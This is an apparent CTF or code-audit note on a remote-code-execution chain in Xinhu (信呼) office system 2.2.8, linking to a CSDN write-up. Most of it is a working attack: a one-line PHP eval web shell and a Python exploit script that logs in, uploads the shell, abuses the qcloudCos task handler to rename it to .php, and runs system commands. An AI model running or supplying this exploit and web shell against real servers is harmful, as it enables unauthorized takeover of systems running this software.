## 2.2.8

[信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE](file:///F:/LocalCTF/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]%E4%BF%A1%E5%91%BC%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F2.2%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%85%8D%E5%90%88%E4%BA%91%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E7%BB%84%E5%90%88%E6%8B%B3RCE_%E4%BF%A1%E5%91%BC2.2.8%20%E6%BC%8F%E6%B4%9E-CSDN%E5%8D%9A%E5%AE%A2.html)

**脚本**

1.php

```php
<?php eval($_GET["1"]);?>
```

exp.py

```python
import requests


session = requests.session()

url_pre = 'http://url/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'dGVzdA::',
    'adminpass': 'YWJjMTIz',
    'yanzm': ''
}


r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('whoami');")
print(r.text)
```